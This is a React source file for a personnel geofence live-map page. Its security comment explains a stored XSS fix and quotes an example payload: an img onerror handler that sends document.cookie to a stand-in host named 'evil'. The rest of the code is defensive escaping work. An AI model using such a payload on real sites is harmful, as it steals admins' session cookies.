"use client";
import React, { useState, useEffect, useCallback, useMemo } from "react";
import { lokasiApi, geofenceApi } from "@/lib/api";
import { onRealtimeEvent } from "@/lib/socketClient";
import { fmtDate, fmtDateTime, statusColor } from "@/lib/formatters";
import { useToast } from "@/hooks/useToast";

/**
 * SECURITY (Stored XSS, Tahap 3):
 * The previous mapHtml assembled the iframe document via string
 * interpolation of attacker-controllable strings (u.nama, u.status,
 * u.lokasi_nama, l.nama) into Leaflet's bindPopup('...HTML...') call,
 * and also into JS string literals. The hand-rolled
 *   .replace(/'/g, "\\\\'")
 * only attempted to escape single quotes in the JS-string context and
 * did NOT escape HTML, so a personnel name of
 *   <img src=x onerror=fetch('https://evil/'+document.cookie)>
 * persisted in the database would execute in every admin's browser the
 * next time they opened the live map. Worse, u.status and u.lokasi_nama
 * weren't even getting that broken escape.
 *
 * Fix: stop concatenating user data into source code. The whole data
 * object is now serialized as JSON (with <, >, &, U+2028, U+2029
 * neutralized so it can't break out of the <script> tag or break the
 * surrounding JS string), injected once, then JSON.parse()'d on the
 * other side. Popups are built with document.createElement +
 * textContent — the DOM auto-escapes everything we set as text. No
 * Leaflet popup ever receives an HTML string built from user data.
 */

/**
 * Serialize an arbitrary value for safe inclusion inside a <script>
 * block. Three classes of character need handling:
 *
 *   - `<`, `>`, `&`  — these are HTML-significant. Without escape, a
 *     value containing the literal text `</script>` would close our
 *     script tag (HTML parser doesn't care that it's inside a JS
 *     string), and the rest of the document would render as plain HTML
 *     with attacker content.
 *   - U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) — JSON
 *     allows these raw, but JS treats them as line terminators inside
 *     string literals. Without escape, a value containing one would
 *     produce a SyntaxError at best, a string-literal break-out at
 *     worst.
 *
 * `\u00xx` escapes are valid both in JSON strings AND in JS string
 * literals, so the result is still parseable JSON when JSON.parse()
 * runs in the iframe.
 */
function safeJsonForScript(obj: any): string {
  return JSON.stringify(obj)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

export default function LiveMapPage() {
  const { toast } = useToast();
  const [data, setData] = useState<any>(null);
  const [lokasi, setLokasi] = useState<any[]>([]);
  const [selLok, setSelLok] = useState("");
  const [loading, setLoading] = useState(true);
  const loadMap = useCallback(async () => {
    try {
      const d = await geofenceApi.liveMap(selLok || undefined);
      setData(d);
    } catch (e: any) {
      toast(e.message, "error");
    }
    setLoading(false);
  }, [selLok]);
  useEffect(() => {
    lokasiApi
      .list("status=active")
      .then((d) => setLokasi(Array.isArray(d) ? d : []))
      .catch(() => {});
  }, []);
  useEffect(() => {
    loadMap();
    const t = setInterval(loadMap, 15000);
    const unsub = onRealtimeEvent((ev) => {
      if (ev.includes("geofence") || ev.includes("location")) loadMap();
    });
    return () => {
      clearInterval(t);
      unsub();
    };
  }, [selLok]);
  const mapHtml = useMemo(() => {
    if (!data) return "";
    const p = Array.isArray(data.personnel) ? data.personnel : [];
    const locs = Array.isArray(data.lokasi) ? data.lokasi : [];

    // Compute fallback center using Number()/isFinite so we never
    // interpolate a non-finite value. (Reserved here in the parent
    // payload — the iframe consumes the same values.)
    const cLatRaw = Number(locs[0]?.latitude ?? p[0]?.latitude);
    const cLngRaw = Number(locs[0]?.longitude ?? p[0]?.longitude);
    const cLat = Number.isFinite(cLatRaw) ? cLatRaw : -0.5;
    const cLng = Number.isFinite(cLngRaw) ? cLngRaw : 101.4;

    // The iframe gets the raw personnel/lokasi arrays as-is. It does
    // its own validation per item (Number() + isFinite) so a single
    // bad row doesn't take down the whole map.
    const payload = safeJsonForScript({
      personnel: p,
      lokasi: locs,
      center: { lat: cLat, lng: cLng },
    });

    // Note on the inline <script>: nothing inside this script
    // concatenates user data. The only ${...} interpolation is
    // `payload`, which has been character-class-escaped above.
    // Everything user-controlled flows through JSON.parse and then
    // textContent (auto-escaped by the DOM).
    return `<!DOCTYPE html><html><head>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>body{margin:0}#m{height:100vh}.popup-line{display:block}</style>
</head><body><div id="m"></div>
<script>
(function(){
  var DATA = JSON.parse(${JSON.stringify(payload)});
  var m = L.map('m').setView([DATA.center.lat, DATA.center.lng], 14);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {maxZoom: 19}).addTo(m);

  // Build a popup element from an array of {text, bold?} parts.
  // textContent is XSS-safe: the browser never parses the string
  // as HTML, it lands in a Text node verbatim.
  function buildPopup(parts) {
    var root = document.createElement('div');
    parts.forEach(function(part) {
      var line = document.createElement('span');
      line.className = 'popup-line';
      if (part.bold) {
        var b = document.createElement('b');
        b.textContent = part.text;
        line.appendChild(b);
      } else {
        line.textContent = part.text;
      }
      root.appendChild(line);
    });
    return root;
  }

  function num(v) { var n = Number(v); return isFinite(n) ? n : null; }

  // Lokasi circles (geofence boundaries).
  (DATA.lokasi || []).forEach(function(l) {
    var lat = num(l.latitude), lng = num(l.longitude);
    if (lat === null || lng === null) return;
    var rad = num(l.radius); if (rad === null) rad = 500;
    var popup = buildPopup([
      { text: String(l.nama == null ? '' : l.nama) + ' (' + rad + 'm)' }
    ]);
    L.circle([lat, lng], {
      radius: rad, color: '#3b82f6', fillOpacity: 0.08,
      weight: 2, dashArray: '5,5'
    }).addTo(m).bindPopup(popup);
  });

  // Personnel markers.
  (DATA.personnel || []).forEach(function(u) {
    var lat = num(u.latitude), lng = num(u.longitude);
    if (lat === null || lng === null) return;
    var inside = !!u.dalam_radius;
    var color = !inside ? '#ef4444'
              : u.status === 'on_duty' ? '#22c55e'
              : '#64748b';
    var jarakNum = num(u.jarak); if (jarakNum === null) jarakNum = 0;
    var popup = buildPopup([
      { text: String(u.nama == null ? '' : u.nama), bold: true },
      { text: String(u.status == null ? '' : u.status) },
      { text: String(u.lokasi_nama == null ? '' : u.lokasi_nama) },
      { text: 'Jarak: ' + jarakNum + 'm' }
    ]);
    L.circleMarker([lat, lng], {
      radius: 8, fillColor: color, color: '#fff',
      weight: 2, fillOpacity: 0.9
    }).addTo(m).bindPopup(popup);
  });
})();
</script></body></html>`;
  }, [data]);
  return (
    <div>
      <div className="page-header">
        <h1 className="page-title">
          <i className="fas fa-map-marked-alt" />
          Live Map - Posisi Real-time
        </h1>
        <div style={{ display: "flex", gap: 8 }}>
          <select
            className="form-select"
            style={{ width: 200 }}
            value={selLok}
            onChange={(e) => setSelLok(e.target.value)}
          >
            <option value="">Semua Lokasi</option>
            {lokasi.map((l) => (
              <option key={l.id} value={l.id}>
                {l.nama}
              </option>
            ))}
          </select>
          <button className="btn btn-outline btn-sm" onClick={loadMap}>
            <i className="fas fa-sync-alt" />
          </button>
        </div>
      </div>
      {data && (
        <div
          style={{
            display: "flex",
            gap: 12,
            marginBottom: 16,
            flexWrap: "wrap",
          }}
        >
          <div className="kpi-card blue" style={{ flex: 1 }}>
            <div className="kpi-icon">
              <i className="fas fa-users" />
            </div>
            <div>
              <div className="kpi-val">{data.personnel?.length || 0}</div>
              <div className="kpi-label">Tertrack</div>
            </div>
          </div>
          <div className="kpi-card green" style={{ flex: 1 }}>
            <div className="kpi-icon">
              <i className="fas fa-check-circle" />
            </div>
            <div>
              <div className="kpi-val">{data.total_online || 0}</div>
              <div className="kpi-label">Online</div>
            </div>
          </div>
          <div className="kpi-card red" style={{ flex: 1 }}>
            <div className="kpi-icon">
              <i className="fas fa-exclamation-circle" />
            </div>
            <div>
              <div className="kpi-val">{data.total_outside || 0}</div>
              <div className="kpi-label">Di Luar Radius</div>
            </div>
          </div>
        </div>
      )}
      <div className="section-card" style={{ padding: 0, overflow: "hidden" }}>
        {loading ? (
          <div style={{ textAlign: "center", padding: 80 }}>Memuat peta...</div>
        ) : (
          <iframe
            srcDoc={mapHtml}
            style={{ width: "100%", height: 550, border: "none" }}
            title="live-map"
          />
        )}
      </div>
      {data?.personnel?.length > 0 && (
        <div className="section-card" style={{ marginTop: 16 }}>
          <h3 style={{ marginBottom: 12 }}>
            📋 Daftar Personil ({data.personnel.length})
          </h3>
          <table>
            <thead>
              <tr>
                <th>Nama</th>
                <th>NRP</th>
                <th>Role</th>
                <th>Status</th>
                <th>Lokasi</th>
                <th>Jarak</th>
                <th>Dalam Radius</th>
                <th>Terakhir</th>
              </tr>
            </thead>
            <tbody>
              {data.personnel.map((p: any) => (
                <tr key={p.id}>
                  <td>
                    <strong>{p.nama}</strong>
                  </td>
                  <td>
                    <code>{p.nrp}</code>
                  </td>
                  <td>{p.role}</td>
                  <td>
                    <span className={`badge badge-${statusColor(p.status)}`}>
                      {p.status}
                    </span>
                  </td>
                  <td>{p.lokasi_nama || "-"}</td>
                  <td>{p.jarak !== null ? `${p.jarak}m` : "-"}</td>
                  <td>{p.dalam_radius ? "✅" : "❌"}</td>
                  <td>{fmtDateTime(p.last_seen)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
